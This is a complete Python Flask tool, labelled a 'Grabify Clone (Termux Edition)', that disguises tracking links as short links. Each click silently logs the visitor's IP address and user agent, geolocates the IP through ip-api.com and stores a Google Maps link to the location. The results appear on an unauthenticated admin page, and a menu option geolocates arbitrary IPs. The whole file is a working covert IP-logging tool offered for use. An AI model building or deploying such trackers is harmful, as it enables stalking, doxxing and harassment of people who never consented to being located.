import sqlite3
import datetime
import sys
import requests
from flask import Flask, request, redirect, render_template_string

DB_FILE = 'grabify.db'
app = Flask(__name__)

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS links (
            code TEXT PRIMARY KEY,
            destination TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT,
            ip TEXT,
            user_agent TEXT,
            timestamp TEXT,
            city TEXT,
            latitude REAL,
            longitude REAL,
            maps_link TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Home page: show custom green large text
@app.route("/")
def home():
    html = '''
    <div style="text-align:center; margin-top:50px;">
      <h1 style="color:green; font-size:48px; font-weight:bold;">
        Made by Mohimanul-TVM
      </h1>
      <p>Create short links from console. Run server and share your ngrok or public URL + code.</p>
      <p>Admin logs at <a href="/admin/logs">/admin/logs</a></p>
    </div>
    '''
    return html

@app.route("/<code>")
def redirector(code):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT destination FROM links WHERE code = ?', (code,))
    row = c.fetchone()
    if not row:
        return "Link not found.", 404

    destination = row[0]
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.datetime.now().isoformat()

    city = None
    lat = None
    lon = None
    maps_link = None
    try:
        geo_resp = requests.get(f"http://ip-api.com/json/{ip}").json()
        if geo_resp.get('status') == 'success':
            city = geo_resp.get('city')
            lat = geo_resp.get('lat')
            lon = geo_resp.get('lon')
            if lat and lon:
                maps_link = f"https://maps.google.com/?q={lat},{lon}"
    except Exception as e:
        print("Geolocation error:", e)

    c.execute('''
        INSERT INTO logs (code, ip, user_agent, timestamp, city, latitude, longitude, maps_link)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (code, ip, user_agent, timestamp, city, lat, lon, maps_link))
    conn.commit()
    conn.close()

    return redirect(destination)

@app.route("/admin/logs")
def admin_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('SELECT code, ip, user_agent, timestamp, city, latitude, longitude, maps_link FROM logs ORDER BY timestamp DESC')
    logs = c.fetchall()
    conn.close()

    html = '''
        <h2 style="text-align:center;">Visitor Logs</h2>
        <table border="1" cellpadding="5" cellspacing="0" style="width:95%; margin:auto; border-collapse: collapse;">
            <thead style="background-color:#eee;">
            <tr>
                <th>Code</th>
                <th>IP</th>
                <th>User-Agent</th>
                <th>Timestamp</th>
                <th>City</th>
                <th>Location</th>
            </tr>
            </thead>
            <tbody>
            {% for log in logs %}
                <tr>
                    <td>{{ log[0] }}</td>
                    <td>{{ log[1] }}</td>
                    <td style="max-width:300px; word-wrap:break-word;">{{ log[2] }}</td>
                    <td>{{ log[3] }}</td>
                    <td>{{ log[4] if log[4] else 'N/A' }}</td>
                    <td>
                        {% if log[7] %}
                            <a href="{{ log[7] }}" target="_blank">View Map</a>
                        {% else %}
                            N/A
                        {% endif %}
                    </td>
                </tr>
            {% endfor %}
            </tbody>
        </table>
        <br>
        <div style="text-align:center;">
          <a href="/">Back to Home</a>
        </div>
    '''
    return render_template_string(html, logs=logs)

def create_short_link():
    code = input("Enter short code: ").strip()
    destination = input("Enter destination URL: ").strip()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    try:
        c.execute('INSERT INTO links (code, destination) VALUES (?, ?)', (code, destination))
        conn.commit()
        print(f"✅ Short link created! Use: /{code} → {destination}")
    except sqlite3.IntegrityError:
        print("❌ Error: Code already exists.")
    finally:
        conn.close()

def start_server():
    print("\n🚀 Starting Flask server on 0.0.0.0:5000 ...")
    print("🔗 Admin logs: http://localhost:5000/admin/logs")
    app.run(host='0.0.0.0', port=5000)

def lookup_ip():
    ip = input("Enter IP address to lookup: ").strip()
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}").json()
        if resp.get('status') == 'success':
            print(f"\n✅ Results for {ip}:")
            print(f"City: {resp.get('city')}")
            print(f"Region: {resp.get('regionName')}")
            print(f"Country: {resp.get('country')}")
            print(f"Latitude: {resp.get('lat')}")
            print(f"Longitude: {resp.get('lon')}")
            print(f"Google Maps: https://maps.google.com/?q={resp.get('lat')},{resp.get('lon')}")
        else:
            print("❌ Failed to lookup IP.")
    except Exception as e:
        print("❌ Error:", e)

def main_menu():
    while True:
        print("\n--- Grabify Clone (Termux Edition) ---")
        print("1. Create short link")
        print("2. Start server")
        print("3. Lookup IP")
        print("4. Exit")
        choice = input("Enter option: ").strip()

        if choice == "1":
            create_short_link()
        elif choice == "2":
            start_server()
        elif choice == "3":
            lookup_ip()
        elif choice == "4":
            print("Goodbye!")
            sys.exit(0)
        else:
            print("Invalid option. Please choose 1, 2, 3, or 4.")

if __name__ == "__main__":
    main_menu()
